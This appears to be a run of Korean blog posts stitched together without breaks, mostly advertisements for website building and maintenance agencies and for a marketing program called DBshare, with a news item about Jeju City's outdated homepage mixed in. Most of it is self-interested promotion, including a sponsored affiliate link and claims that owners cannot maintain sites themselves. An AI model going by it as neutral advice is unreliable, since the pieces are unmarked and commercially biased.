흐름을 파악하여광고를 관리하여 효과를 극대화할 수 있도록 최선을 다하고 있습니다.​저희 업체는 홈페이지 제작부터 관리까지 진행하는업체로 모든 과정이 한곳에서 이루어지므로그 완성도를 매우 높일 수 있습니다.​ 홈페이지 관리문의는웨일즈소프트로 문의하세요!!1661-9440​카톡문의 웨일즈소프트#홈페이지제작#모바일웹앱제작#쇼핑몰#도메인#호스팅#홈페이지유지보수#그누보드#영카트#반응형open.kakao.com ​톡톡문의 웨일즈소프트 - 네이버톡톡홈페이지제작, 모바일웹/앱, 쇼핑몰, 도메인, 호스팅 전문 기업입니다.talk.naver.com ​홈페이지바로가기 웨일즈소프트홈페이지제작, 쇼핑몰, 모바일, 도메인, 서버/웹호스팅, 웹사이트 개발, 유지/보수, 개인/기업/회사/반응형 웹 등 온라인 웹서비스 전문 업체입니다.whalessoft.com  ​ 요즘은 코딩을 할 줄 알면 홈페이지도 직접 만들 수 있어요정말 세상이 갈수록 편해지는 게 느껴지는 것 같아요  하지만 홈페이지가 단순 기능만 한다고 다 같은 홈페이지일까요???  편리하게 홈페이지를 만들 수 있지만 전문 디자이너의 디자인이 매우 중요하답니다 ㅎㅎ  그래서 전문적으로 홈페이지가 필요한 분들이나, 상품의 홍보를 위한 분들 등이 특히 필요할 거라고 생각이 듭니다.따라서 이번에 바른웹을 소개해드리려고 해요​ 바른웹은 월 3만 원의 합리적인 가격으로 본인 소유의 홈페이지를 운영할 수 있어요또한, 7년간 10,000여 개 넘게 홈페이지를 제작한 경험이 있고기업부설연구에서 인증받은 업체이기에 더욱 안심할 수 있어요​또한, 전문가의 손길이 들어가기 때문에웹페이지의 디자인, 상품 배열 등 원하는 대로 설정하여 디자인을 맡길 수 있어요​ 또 다른 장점은 바른웹에서 5년 이후부턴 유지 비용이 발생되지 않아 오랜 기간 사업을 하시는 분들께 비용 절감의 기회가 될 수 있어비용 부담 문제도 해결돼요5년간 단돈 월 3만 원으로요! ​사업을 새로 시작하는 사람들 또한 언제든지 수정 및 관리가 가능한 홈페이지를 합리적인 가격으로 생성할 수 있다는 장점을 가지고 있답니다.  또 다른 혜택이 있는데요!바로 타사 맞춤형 제작 시 PC/모바일/반응형 홈페이지 제작을 무료로 제공하고 있습니다.!!​참고하시고 좋은 홈페이지 만드시길 바랄게요아래 링크에서 상담받아보세요~~!​​​https://leaderscpa.com/merchant/barunhome/log.asp?npid=34362 무료홈페이지제작※ 월 3만원의 관리비 만으로도 이 모든 혜택이 가능!leaderscpa.com ​위의 포스팅은 해당 업체에서 경제적 대가를 받을 수도 있습니다. 초창기의 기본적인 웹 디자인은 업체를 통해 맡길 예정이고 추후에 들어가는 서버 관리 등을제가 직접 관리 하고 싶습니다. 그래서 코딩 공부를 전문적으로 배우고 싶은데요처음부터 끝까지 어떤 과정이 있고 꼭 필요한 역량이 어떤 것이 있는지 알고 싶습니다.지식인에 올라온 유지보수 관련된 질문입니다.​홈페이지제작 및 유지관리, 수정을 진행하는 입장에서 유지보수와 관리를 고객이 직접 할 수 있는 것인지 간단히 알아보겠습니다. © christianw, 출처 Unsplash 홈페이지제작이후 유지관리는 어떤 것이 필요할까?​홈페이지제작 이후에 유지관리는 크게 3가지로 나뉠 수 있습니다. © gohrhyyan, 출처 Unsplash 1) 운영유지관리: 게시판글쓰기/답변, 회원 관리, 팝업관리 등이 있고, 쇼핑몰의 경우 추가로  상품등록/관리, 주문관리, 배송관리, 결제관리 등이 들어갑니다.대부분은 고객이 제작당시에 제작업체가 제공하는 별도 관리자모드를 통해 직접 진행을 하게되는 분야이며, 일반적으로 제작업체들이 얘기하는 유지보수는 이와 관계가 없습니다. © jacksloop, 출처 Unsplash 2) 디자인유지관리: 단순 텍스트로 글을 올리면 되는 게시판 등과는 달리, 팝업이라든지, 내부 페이지 추가/변경이라든지, 메인 이미지 변경이라든지 등은 전문 포토샵 사용방법과 간단한 html 문법을 아는 상태에서만 가능합니다.무엇보다 디자인적인 감각이 필수적입니다. 왜냐면, 단순히 디자인을 잘 모르는 사람이 '방법'만 안다고 되는 분야가 아니라..기존 만들어져있는 사이트 전체 색감과 레이아웃을 해치지 않는 범위에서 디자인을 진행해야 되기 때문입니다.  전문 제작/인력에게 맡기는 게 좋습니다.가끔 이 부분을 스스로 한다고 했다가,, 팝업 디자인 아마츄어적으로 만들어서 전체 사이트 퀄리티를 낮춰지게 하는 경우도 있습니다. © hobiindustri, 출처 Unsplash 3) 기술유지관리: 전문 웹프로그래밍과 퍼블리싱을 아는 인력을 통해서만 가능합니다.일반 제작원리도 만들어진 2~300만원대 이하의 홈페이지는 타사 업체 인력도 기술유지관리가 가능하고 아주 간단한 기능 수정도 가능하지만..전문적인 소스 수정은 특히 제작업체 인력이 아니고서는 복잡한 기술관리는 대부분 어렵습니다.  © blizzard88, 출처 Unsplash 4) 서버유지관리물리적으로 호스팅을 하고 인터넷회선이 연결되는 서버관리를 말합니다.물리적으로 서버에 문제가 있거나 인터넷회선이 문제가 있으면 홈페이지가 불안정하거나 아예 뜨지 않는 사태가 발생됩니다.  요즘은 보통은 서버전문업체들이 이미 성공적으로 수행하고 있습니다. © the_roaming_platypus, 출처 Unsplash ​위 4 가지 중에서 1)운영유지관리는 보통 직접 하게 되고 2)디자인유지관리와 3)기술유지관리는 전문 업체와 인력을 통해 맡기게 되며 4)서버관리는 홈페이지제작업체나 별도 서버업체를 통해 맡겨지게 됩니다.가끔 빌더형 홈페이지제작업체에서 2)가 가능하다고 선전하는데..대부분...어렵습니다.'전문적인 디자인감각'이 필요하기 때문입니다. © single_lens_reflex, 출처 Unsplash 자..다시..앞에 질문으로 되돌아가서..직접 코딩을 배워서 직접 관리를 하고 싶다고 하셨는데요..결론적으로.. "어렵습니다.. 그냥 기존 제작업체에 유지관리를 맡기시기 바랍니다.."​왜냐면..하나의 홈페이지를 제대로 만드려면 최소 수백 정도의 비용으로 2~4년차 이상의 전문 웹디자이너, 전문 웹기술자가 같이 협업해서 만들게 됩니다. 이 말 뜻은 그만큼의 시행착오와 그만큼의 시간투자를 한 후에서야 원활한 상업적인 용도의 사이트를 제작하고 디자인/기술운영을 할 수 있다는 뜻입니다. © pixelfreund, 출처 Unsplash 코딩을 아무리 배워도..실전이 없으면 쓸모 없습니다. 단순히 책이나 학원을 통해 배우는 코딩은 결국 시행착오를 겪게 되는데..개인 홈페이지이고 시행착오 거쳐도 되는 홈페이지, 며칠 이상 오류 상태로 떠도 괜찮은 홈페이지라면 이러한 시행착오를 직접 시연해봐도 상관없습니다.하지만..대부분의 상업용 홈페이지는 이렇게 오류가 발생되고 아마츄어적인 느낌이 나면 안되기 때문에 결국 전문인력에게 유지보수를 맡기는 것입니다. © warnerl, 출처 Unsplash 그래서,, 저희는 되도록이면 전문 홈페이지제작 관리 유지보수 업체에 유지관리를 맡기라고 하고 싶습니다.특히...정상적으로 서버/소스관리를 하더라도..뜻하지 않는 이유로 (관리자 PC의 사정으로..혹은 사용자들 PC/모바일의 환경변화로..) 홈페이지가 잘못되는 경우도 있습니다.이 경우 유지관리를 이미 받고 있는 홈페이지와 못받고 있는 홈페이지는 그 대처 방법이 하늘과 땅 차이입니다.​요즘은 유지보수 비용이 예전처럼 많이 비싸지도 않습니다.개인 집에서 인터넷회선비용이 월3만원 수준이라고 봤을 때, 그보다 저렴하게 위 4)의 서버관리가 가능하고 그 정도 가격으로 기본적인 홈페이지 소스관리까지 대부분 가능합니다. © alschim, 출처 Unsplash 스스로 공부해서 관리하기보다..1년 겨우 몇 십만원 정도의 비용으로 연봉 몇 천만원대의 전문기술자를 운용한다고 생각하시는 게, 결국 내 홈페이지를 위해서 가장 현명한 선택입니다.​이상, 홈페이지유지관리, 수정, 유지보수 전문업체www.홈페이지제작.kr 이였습니다. 모든 홈페이지제작의 기준 홈페이지제작.kr홈페이지제작의 기준, 기업 및 단체 웹사이트제작, 1000여 고객사, 10년이상 노하우,www.홈페이지제작.kr 홈페이지유지보수관련 문의도전국 어디서나 물어보세요1661-5668번거롭다고요? 인터넷으로 바로 상담도 가능합니다!http://www.홈페이지제작.kr/bbs/write.php?bo_table=consulting 제작상담하기 글쓰기 | 홈페이지제작 is 홈페이지제작.kr홈페이지제작의 기준, 기업 및 단체 웹사이트제작, 1000여 고객사, 10년이상 노하우,www.홈페이지제작.kr ​ ​안녕하세요.울산인테리어필름 시공의 명가 로덴인테리어필름입니다.간단하지만 중요한 알림사항을 전해드립니다. ​1. 로덴인테리어필름은 단한번도 외부 유료광고를 하지 않고 있습니다.광고비에 지출할 비용이 없어서가 아닙니다.고객과의 약속과 신뢰를 지키고 책임있는 시공을 하기 때문입니다.​유료광고는 일감이 없고 시공기술에 자신이 없기 때문에 의뢰하는 바보같은 짓입니다.  저희는 유료광고를 해본적도 없지만 앞으로도 유료광고에 기댈 생각조차도 없습니다.주식도 뉴스나 정보에 기대거나 유료 뷰티크에 몸담아 투자하는 묻지마 투자자와 어렵고 힘들지만 직접공부하고 시행착오 겪고 자기검증을 하면서 체화된 투자자가 중에서  과연 누가 승자가 될까요? 과연 누가 살아남을까요? ​2. 로덴인테리어필름 홈페이지와 블로그 관리는 누가 하느냐??홈페이지는 비싼돈 들여 제작할 생각도, 의뢰할 계획이 없습니다.​저희는 오랫동안의 역사가 담긴 개인블로그에 울산인테리어필름 도배 시공후기를 소개 하고, 추천하고 있습니다.추천 시공후기는 그유명한 독수리타법으로 두어시간 이상 걸려서 직접 작성하고 수정해서 올려드리고 있습니다.로덴필름의 대표기사인 제가 직접 글쓰고 문의에 대한 상담과 답변까지 하고 있습니다.저희 로덴필름은 단한번도 블로그 관리를 외부의뢰 하지않았습니다.​​또한, 저희로덴인테리필름은 현장미팅과 상담부터 시공, A/S까지 저의 두발과 두손으로, 온마음으로  직접 하고 있습니다.수주후 시공도 외부의뢰를 하지않고 저희 팀원들이 직접 시공과 마감까지하고 있습니다.저 대표기사도 현장에서 직접 기초작업과  재단, 시공 , 마감까지 책임있게 현장을 지키고 있습니다. ​로덴 인테리어필름 도배 전문시공사는 약속이 생명입니다.내집을 시공하는마음으로 책임있는 시공을 약속드립니다.​감사합니다.​ ​ ​​​“제주시 홈페이지 직원업무 조직도 관리 '엉망'..소통 불능 공간 전락’”                                                                                    ‘일부 과장 수시 인사 전 직책그대로 표기..일부  '팀' 명칭과 '팀장' 이름도 없어’http://www.newsje.com/news/articleView.html?idxno=208968 제주시 홈페이지 관리가 엉망인 것으로 드러나 특단의 대책이 요구된다.제주시는 생활 안내 및 각종 민원과 직원업무 등을 게재한 시 홈페이지(http://www.jejusi.go.kr/)를 운영하고 있다.제주시 홈페이지는 생활 민원과 시와 관련된 통계, 허가 절차 등 시민들에게 필요한 시정을 제공하고 있다.그러나 관리가 제대로 되지 않아 시민들에게 잘못된 정보를 제공, 이용자들이 혼돈을 빚고 있어 ‘불통공간’으로 전락했다는 지적을 받고 있다.제주시는 주민복지과장 공석에 따른 수시인사를 단행했다.하지만 10일자 홈페이지를 보면 주민복지과장은 여전히 공석으로 돼있는가 하면 일부 과장들은 인사발령 전 직책이 그대로 돼 있다.시는 지난달 27일자로 주민복지과장에 김태리 기초생활보장과장을 인사발령 됐지만 여전히 기초생활보장과장으로 돼 있고 기초생활보장과장에 김미숙 건입동장을 발령했지만 여전히 건입동장으로, 건입동장에는 김현숙 사무관을 발령했지만 전 김미숙 건입동장으로 됐다. 제주시가 지난 달 수시인사를 단행했지만 홈페이지 조직도에는 수시인사 전 직책이 그대로 돼있다.제주시는 지난해 시민들이 다양한 IT기기를 통해 시청 홈페이지를 손쉽게 이용할 수 있도록 홈페이지를 전면 개편했지만 오래전부터 멈춘 상태라는 지적이다.홈페이지가 소통 불능의 공간으로 전락했다.일부 정보가 빠지거나 사라진 '팀'이 있는가하면 아예 이름이 빠져 이쓴 등 홈페이지가 엉망으로 운영되고 있지만, 개선될 기미는 보이지 않고 있다.또한 개인정보 등으로 삭제 했을 것으로 판단되지만 그러면 '팀'명칭이라도 있어야 하는데도 이를 방치하고 있는 것으로 드러났다.이로 인해 담당업무 공무원을 찾을 수 없어 홈페이지를 이용하는 민원인의 불만은 증폭되고 있는 게 현실이다.민원인 김씨는 “담당자를 홈페이지에서 찾아보려고 했지만, 담당부서가 어디인지조차 찾기 어려웠다”며 분통을 터트렸다. 완주에 소재한 브이디자인 고객 펜션 홈페이지의 수정작업이 완료되었습니다.새로운 객실 가격표를 적용하기 위한 작업이었습니다.오래전에 만들어진 홈페이지이며, 객실 소개 내용을 통이미지로 작업되어 있어..객실정보 및 요금을 수정할 때마다.. 번거롭고 비효율적인 이미지 작업이 발생하였습니다.향후 발생할 수정사항을 고려하여, 요금 부분을 텍스트로 처리하여 홈페이지 수정이 용이하도록 처리하엿습니다.- HTML 테이블 코딩으로 요금표 제작- 각 객실별 include 방식으로 한번 수정으로 완료- 반복되는 예약안내 이미지 통일- 모바일 홈페이지는 프로그램방식으로 처리- 예약안내 전체 객실 요금표도 include방식으로 처리이제 객실요금 수정을 빠르고 쉽게 저렴한 비용으로 처리할 수 있는 여건이 되었습니다.홈페이지 유지보수 비용은 얼마나 효율적으로 수정할 수 있게 만드는가도 중요합니다.다만, 디자인적인 부분에 가치를 둔다면 불편한 유지보수 부분과 비용도 감수해야 합니다.감사합니다. #전주홈페이지유지보수#전주홈페이지관리#전주홈페이지수정#전주홈페이지작업안녕하세요 요양원 홈페이지 제작업체 느티나무넷입니다 ^^​요양원 홈페이지 제작을 알아보고 계신가요? : )믿을 수 있는 업체를 선택하는것그리고안정적으로 제작하고 관리까지잘 마무리 하는것​간단해보이지만 과정을 거치다보면결코 쉽지 않는 과정이 되기도 합니다​요양원홈페이지제작을 시작하기전에업체선정부터제작과 이후 편리한 관리까지​느티나무넷이라면만족 할 수 있는요양원홈페이지를 제작해드립니다   느티나무넷은 33만원의 거품없는 합리적인 구축비용과월 22,000원의 사용료를 기반으로정직한 홈페이지 제작과 서비스를 하고 있습니다 요즘 PC에서 홈페이지를 보는 사용자보다모바일 기기에서 홈페이지를 보는 사용자가훨씬 많아졌습니다.코로나로 인해 PC 사용자가 다시 늘었다 하지만여전히 모바일 사용자가 더 많지요​느티나무넷은 PC + 태블릿 + 스마트폰 어디서든사용할 수 있는 반응형 홈페이지 기반으로 제작합니다​  느티나무넷의 독보적인 장점 중 하나는10년 이상 경력을 자랑하는 디자이너들이 만들어내는다양하고 퀄리티 높은 디자인입니다.​디자인 컨텐츠와 느티나무넷이 20년간 홈페이지 제작을 하면서준비되어 있는 많은 제작 자료를 통해부족한 자료가 있더라도 충분히 제작을 지원해드리고 있습니다 느티나무넷으로 요양원홈페이지제작시홈페이지만 서비스하는것만이 아닙니다​모바일 어플과 행복버스위치알림 웹진등다양한 부가서비스를 통해​홈페이지 서비스를 다양한 방법으로활용할 수 있도록지원하고있습니다  홈페이지 제작만이 끝이 아니죠!제작 이후 관리가 어렵다면 홈페이지가 오래 유지되기 어렵습니다느티나무넷은 쉽고 편하게 홈페이지 관리를 할 수 있도록직접 수정이 가능한 홈페이지 수정 시스템과다양한 팝업 샘플과 문구 수정으로 팝업을 만들어낼 수 있는팝업 제작 시스템을 제공하여​홈페이지 운영이 어렵지 않고부담없는 관리를 할 수 있도록 시스템을 제공하고 있습니다  요양원 홈페이지 제작 느티나무넷을 통해합리적이고 거품없는 제작과효율적인 관리 기능으로믿고 맡겨보시는건 어떨까요?​지금 상담 가능합니다 :) 느티나무넷복지관 요양원 홈페이지 제작, 스마트폰 홈페이지, 쉽고 편한 관리 시스템www.neutinamu.net ​ ​블로그 홈페이지 관리 지속적으로 관리 하기 힘드셨죠?​아침을 담다​에서 도와 드리겠습니다.​블로그 홈페이지란?​기존 블로그의 레이아웃과 달리기업 또는 브랜드와 맞게, 홈페이지 형식의 블로그를제작 하는 것을 의미 합니다.​잘키운 블로그 홈페이지는원하는 키워드를 잡아고객층 확보가 더 쉽습니다.​블로그 홈페이지로 접근성을 더 높일 수 있지만,막상 관리를 하면 블로그와 마케팅에 대해전문가가 아닌 이상은 생각 보다 어렵습니다.​​아침을 담다의 블로그 홈페이지 관리 필요성​브랜드의 이미지에 걸맞는 스킨과 타이틀그리고 자유로운 카테고리를 위젯의 형식으로더욱 뛰어난 접근성을 가진블로그로 리뉴얼​​ ​합니다.​전문성이 있는 아침을 담다만의 차별화된블로그 홈페이지 관리의 필요성을 느껴보세요!​블로그 관리뿐만 아니라1일 1포스팅 (월30회)2일 1포스팅 (월12회)등의 꾸준한 포스팅 서비스로홈페이지에 대한 접근성을 높여줍니다.​홈페이지 6개월 이상 관리시블로그 홈페이지 무료제작1년 계약시 1개월 추가 관리 서비스아침을 담다의 장기 관리 플랜도 만나 보세요​블로그 홈페이지의 적합한 업종전문직종,병원,학원 등등​아침을 담다는 업종과 상황을 고려하여고객사에 맞는 마케팅을 컨설팅 합니다.​천안, 아산, 평택, 세종, 청주 등충남 지역 많은 분들이 만족 하고 계십니다.​​​아침을 담다는 언제든 환영합니다~!! ​상담문의 아래 전화로 부탁드립니다. ​ ​ 사랑의 콜센타를 사랑해주셔서 감사합니다! 이번 콜센타의 주제와 ​전화신청 시간은  ​돌아오는 ​4월 12일(일) 정오에 공개될 예정​입니다!​많은 사랑과 관심 부탁드립니다 1차 전화신청 3월 30일 이후 ​2차 전화 신청이 4월 12일 입니다.​1차 전화신청으로 3회까지 녹화를 마친 모양입니다.​왠만하면 많은 관심을 가지고 계신​미스터 트롯 사랑의 콜센타를 ​응원하시는 분들을 위해서라면 ​홈페이지 관리를 소홀히 하면 안될 것입니다.​TV조선은 앞으로 개선해야할 부분이 많아 보입니다.​​ TOP7이 있잖아요! 〈힘을 내요 대한민국〉_신청곡을 불러드립니다-사랑의 콜센타 3회 예고 시간대에 전화신청이 많이 밀려오기때문에 ​준비를 하셔야 합니다.​"많아서 혼선이 되었다?" ​"전화가 많이 와서 갑자기 수신 장애가 되었다?" ​"전화받는 분들이 현저히 부족하다?" 등 ​이런 내용등의 방지 대책을 세워야 할것입니다.​그 만한 노력은 해줘야 하지 않을 까요? ​의견을 담아 봅니다.​ ​ ​안녕하세요. 요즘 많은 분들이 온라인으로 영업을 하시고 관리를 하십니다. 영업을 하시는 분들은 다양한 고민이 있으신데요. 내가 하는 영업이 홍보되지 않는다거나, 특징을 잘 살리지 못하고 있다거나, 혹은 이러한 이유로 마케팅사업을 진행하였는데 별다른 효과를 보지 못하거나 다양한 사연이 있습니다. 안타까운 마음 뿐인데요. 이전에는 단순히 전단지, 현수막 광고뿐이였다면 요즘에는 다양한 홍보들이 생겨나고 새로운 소비자관리 기능이 떠오르고 있습니다. 그런데 이런 온라인 영업관리 정말 쉽지않죠?​ 컴퓨터에 대해 잘 모르시거나 프로그램 관리가 어려우신 분들 !바쁘신 분들은 홈페이지 관리하시기 힘드시죠 ?보통 사업을 시작하시게 되시면 홈페이지를 다양한 콘텐츠로 운영을 하세요. 그럼 이러한 홈페이지는 어떤 도움을 줄까요? 이런 홈페이지는 마케팅에 있어서 정말 큰 영향을 끼치고 있습니다. 나의 제품과 내 사업체를 홍보하기 위해서 많이 홈페이지를 제작합니다.    그러면 이런 홈페이지 누가 관리할까요 ?아마 대부분 학원홈페이지관리, 음식점홈페이지관리, 의류홈페이지관리, 가구홈페이지관리 등 그 업체가 관리하기 보다는 마케팅회사와 업체에 부탁을 하고는 합니다. 다양한 마케팅뿐만 아니라 홈페이지 관리도 도움을 받는 분들이 많으십니다. 마케팅 회사의 도움으로 홈페이지관리를 하게되면 좀더 체계적이고, 집중적으로 관리가 가능하신데요. 과연 그 비법이 무엇일까요? ​저는 오늘 이런 온라인 영업관리에 있어서 프로그램을 하나 소개시켜드릴까 합니다. ​바로 디비쉐어 2.0이란 프로그램인데요, 제가 왜 이 프로그램을 콕집어서 설명을 드리냐! 지금 부터 좀더 자세히 설명을 해드리겠습니다. 디비쉐어 2.0을 알아보면서 현재 진행하고 있는 영업과 마케팅방법에 대해서 다시한번 생각해보세요.    ​효과있는 영업관리, 사람들의 눈길을 끄는 마케팅은 어떻게 해야 가능할까요? 우선 소비자들의 눈길을 이끌고 관심을 보이게 만들어야 매출상승에도 도움이 되고 홍보도 가능할텐데요. 그렇다면 소비자의 심리를 잘 파악해야겠죠? 어떤 제품을 필요로하는지 어떤디자인과 어떤 기능을 선호하는지, 요즘 트렌드는 무엇인지를 잘 파악해야합니다. ​ 소비자의 니즈를 빨리 파악하고 빠르게 대응하는 것이 중요하다 이런 부분에 대해서 정보가 없는 분들은 많이 힘드실거에요. 디비쉐어2.0은 효과적인 결과, 소비자의 높은 만족도, 효과있는 마케팅을 위해서 지속적이고 체계적으로 분석을 진행한답니다. 이렇게 함으로써 좋은 솔루션을 도입하여 결과 창출에 있어서 훨씬 더 나은 결과를 창출해내는게 목접입니다.   온라인 시장의 확장 : 다양한 콘텐츠와 대용량의 글을 배포하되 거짓되지 않고 특징을 잘 살려야 한다 ​이렇게 온라인 시장을 확장하여 소비자들의 눈에 띌수 있게 정보를 활성화 시키고, 다양한 리뷰들과 이벤트, 할인 쿠폰등도 방법이 흔한데요. 요즘 할인쿠폰, 세일, 가을맞이 할인, 초특가할인 등으로 소비자들의 이목을 끕니다. 또한 많은 소비자들이 어떤 특정한 물건을 구매할때 리뷰를 참고하고 구매에 대한 결정을 하는데요. 디비쉐어 2.0은 이런 리뷰를 중요시하여 제품을 좀더 강조하고 사람들이 잘 기억할수 있도록 마케팅을 진행하고 있습니다. 뿐만아니라 요즘에는 블로그, 페이스북, 인스타그램 등 다양한 SNS로 마케팅을 진행하는걸 많이 보실수 있으신데요. 많은 사람들이 SNS를 접하고 이를 통해 정보를 얻고 상품을 구매합니다. 이를 꿰뚫어 많은곳에 키워드를 노출시키고 확실한 디자인 퀄리티로 소비자들의 주위를 집중시켜드립니다. 특히나 젊은 10대, 20대들한테는 SNS가 일상화 되었는데요. SNS를 통한 마케팅을 잘 이용하면 입소문도 빠르고 다양한 정보를 사람들이 접할수 있게끔 할수 있습니다. 다양한 컨텐츠와 대용량의 글을 배포하되 거짓되지 않고 특징을 잘 살려야 한다는 점! 허구성이 가득한 광고 속에서도 소비자들에게 정확한 정보로 신뢰도를 높이는 점을 중요시하고 있습니다. 이렇게 요즘시대에 온라인 영업은 필수적인 요소중 하나로 자리를 잡게 되었습니다. 모바일에는 무한한 정보와 지식들로 이루어져 있는데 이러한 영역에 크게 그리고 효과적으로 접근해야하는 것은 영업에 있어서 중요한 점이죠. 이런 마케팅을 잘 이루어나간다면 실질적으로 큰 구매효과를 불러일으킬수 있습니다. 디비쉐어는 구매활동을 분석하고 연구하여 어떻게 해야 사람들의 이목을 끌수 있고 기억에 남을만한 마케팅을 진행할수 있는지 계속해서 발전해나아가고 있습니다.   너무나 많은 광고 속에서 살아남는 방법 따로 있을까 ? 어떻게 해야 좋을까요? 예를들어서 학원홈페이지관리로 살짝 이야기를 해드리겠습니다. 요즘에는 수학학원, 영어학원, 온라인재택학원, 고시학원, 입시학원, 미술학원 분야도 다양한데요. 수도권의 한 건물만 보셔도 학원을 많이 보실수 있으세요. 하지만 간단한 홍보를 통해서 과연 홍보가 가능할까요? 다른학원과 별다를바 없는 글들과 콘텐츠로는 불가능하십니다! 홈페이지를 좀더 활성화 시키며 사람들이 관심이 가게끔 하는것도 정말 중요한 부분인데요. 학원홈페이지관리를 할 경우에는 다른학원과는 차별화된 부분을 강조하며 학부모들이 만족할만한 그리고 궁금해할만한 내용들로 구성을 합니다. 요즘 대학입시, 많이 찾으시는 분야에 대해서 집중적으로 분석하고 그 부분을 공략하여 홈페이지 관리에 들어가게 됩니다. 이렇게 전문적인 관리가 들어가게 되면 다른학원홈페이지들에 비해서 좀더 눈에 띄게 되겠죠? ​ 디비쉐어 이용한다면 ?​학원홈페이지관리 뿐만 아니라 다른 분야도 그 특징에 맞게 플랜이 짜여집니다. 나의 사업에 가장 적절하고 필요한 프로세스를 찾을수 있으세요.​마케팅홍보에 있어서 가장 중요한 점은 소비자들의 흥미를 불러 일으킬수 있고 평소에 보지못했던 새로운 매력적인 컨텐츠를 어필하는 것인데요. 이런 콘텐츠를 제작하기 위해서 기획하고 새로운것에 대한 아이디어를 창출하고 많은곳에 배포하는것이 정말 중요합니다. 디비쉐어 2.0은 이 모든것이 가능한데요. 이런 것들을 인바운드영업! 이라고 합니다.   소비자의 유입 경로부터 파악하고 분석하자 ​그런데 그 많은 마케팅업체들중 디비쉐어 프로그램을 이용하시는 분들이 있으신데요. 왜 디비쉐어를 이렇게 많이 찾으실까요? 디비쉐어는 단순 홍보 마케팅이 아닙니다! 고객하나하나를 확인하실수 있으세요. 소비자의 정보를 기록하여 파악할수 있다는 점! 소비자가 어떻게 유입하였고 어떤 분야에 관심이 있는지 알아볼수 있는데요. 이렇게 유입경로를 파악함으로써 어떤 매체를 이용할지 어떤 콘텐츠를 내세울지를 결정하게 됩니다. 소비자들이 선호하는 채널과 어떤 콘텐츠에 흥미를 보이는지 분석하는데 큰 역할을 합니다. 유입경로를 파악하는걸 중요시 하고 있습니다. 소비자의 생각을 꿰뚫어볼수 있는 정말 중요한 역할을 하죠.   고객 유입 시 즉각적인 sms 문자 전송: 상담으로 즉시 연결 가능  ​또한 소비자들과 상담연결을 하는데에 큰 도움을 드리고 있는데요. 처음 마케팅홍보를 통해서 관심을 갖고 소비자가 홈페이지에 유입했을 해서 상담을 하게되는데요, 이 상담이 정말 중요하죠? 상담을 통해서 저 자세한 정보를 제공할수 있습니다. 이렇게 정보를 제공할때에 소비자가 원하는 부분을 콕 찝어내는게 정말 중요한 부분인데요. 소비자가 어떤부분에 관심을 갖는지 어떤 부분을 원해서 찾아온것인지를 잘 파악해야 합니다. 이렇게 소비자가 찾아왔을때 바로바로 상담을 진행하면 구매확률도 상승하게됩니다. 관심이 생겼을때 그 시기를 놓치지않고 캐치해내는게 마케팅 성공률이 높아지는데요, 디비쉐어2.0은 그렇게 소비자가 홈페이지에 방문을 했을때 SMS로 자동알림을 해주는 기능이 있습니다. 이렇게 함으로써 고객한명한명에 신경을 쓸수 있고 놓치는것을 방지할수 있습니다. 문자를 통해서 날짜와 시간은 물론이거니와 유입주소까지 확인할수 있으니 효율적으로 인바운드 영업을 이루어낼수 있습니다.    소비자가 불편하지 않도록 최적화된 시스템 - 디비쉐어 그리고 이렇게 상담이 이루어지고 가장 중요한것은 상담내용인데요. 언제 어떤 상황이 이루어질지 모르기때문에 이런 기록은 중요한 부분이기도합니다. 종종 상담을 진행하실때 직접 손으로 상담서를 작성하는 업체가 있는데 이럴경우에는 집중하지 못하고 놓치는 내용이 있기 마련이죠. 그것을 방지하기위해 상담 저장을 할수 있는 기능이 있습니다. 순간적으로 지나칠수 있는 소비자들의 의견을 놓치지않고 잡아내어 그 부분에 있어서 더 신경을 쓰고 소비자의 만족도를 높일수 있습니다. 영업에 있어서 소비자의 의견은 정말 중요한 역할을 하는데요, 그런것들을 잡아내고 실행에 옮기면 소비자들의 신뢰도도 상승하고 소비자를 생각하는 마음이 나타나며 크게 기억에 남게됩니다. 요즘에는 클라이언트들이 불필요함을 느끼면 홈페이지를 탈퇴하고는 하는데요. 이렇게 탈퇴율을 줄이고 지속적으로 고객들을 관리하면서 만족도를 상승시켜드릴수 있습니다. 불필요한 과정을 생략할수 있고 영업활동에 더욱 집중할수 있으니 그만큼 영업과 마케팅에 있어서 퀄리티가 높아집니다.    1. 어떻게 하면 소비자의 만족도를 높일 수 있을지2. 어떻게 하면 효율적으로 영업할 것인 지 마케팅을 진행하다보면 소비자들도 늘고 수입도 늘고 확실히 신경써야할 분야가 넓어지게 되는데요. 이 정보들을 놓치지않고 필요하실때마다 확인하실수 있습니다. 고객이 찾아올때마다 누적되는 데이터들을 하나하나 직접 오프라인으로 관리하는것은 정말 힘듭니다. 서류의 양도 다양할것이고 나중에 찾을때도 꽤 시간이 걸리고는 하는데요. 예를들어서 업체를 찾아준 고객이 재상담을 요청했을때도 즉각적으로 정보를 가져와서 빠르게 일을 진행하실수 있습니다. 이런 부분에 있어서 소비자들의 호감을 얻고 확실한 프로세스를 증명해보일수 있겠죠? 대용량 데이터를 한꺼번에 관리하실수 있고 체계적인 시스템을 구축할수 있다는 장점이 있습니다. 뿐만 아니라 정산내역도 편하게 확인하실수 있는데요. 이를 통해서 비교가 더 빠르고 그에대한 해결책을 생각해 내는데도 큰 도움이 됩니다. 어떻게해야 좀더 마케팅을 효율적으로 영업할 것인지, 소비자의 만족도를 높일수 있는지에 대해서 파악하고 영업자들에게 동기를 부여하며 이런 과정을 통해서 효과를 증진시킬수 있습니다. 영업자들도 이런 비교를 통하여 동기를 갖고 일의 능률도 높일수 있습니다. 무언가를 실행했을때 그에 따른 결과는 정말 중요한 역할을 하는데요. 직원들의 사기를 높일수 있고 영업에 대한 가능성을 보여줄수 있습니다. 영업에 있어서 마케팅과 소비자의 역할도 크지만 영업자들의 능률도 정말 중요합니다. 사업권 실적 베스트 기능을 통해서 능력있는 영업자를 분류해낼수 있고 부족한 점을 채워나감으로써 좀 더 나은 영업체계를 꾸려나갈수 있습니다.    시간과 비용을 절약하자 이렇게 디비쉐어 프로그램으로 홈페이지관리를 하시게 된다면 시간과 비용을 절약할수 있겠죠? 흔하디 흔한 마케팅 전략으로 효과를 보지 못하시고 포기하신 분들이 많으실 겁니다. 이럴수록 좀더 체계적으로 그리고 신박한 방법으로 마케팅을 진행하셔야합니다. 그리고 꼼꼼한 플랜과 새로운 프로그램 기능으로 효율적인 마케팅을 진행하시는건 어떠실까요? 여태까지의 영업을 한단계 더 업그레이드 시켜서 점점 커져가는 매출효과를 한번 느껴보세요. ​브랜드의 가치를 상승시키고 많은 소비자들에게 그 브랜드의 존재를 알리는것은 정말 중요합니다. 그리고 소중한 고객 한명한명의 관리도 신경써야하는데요, 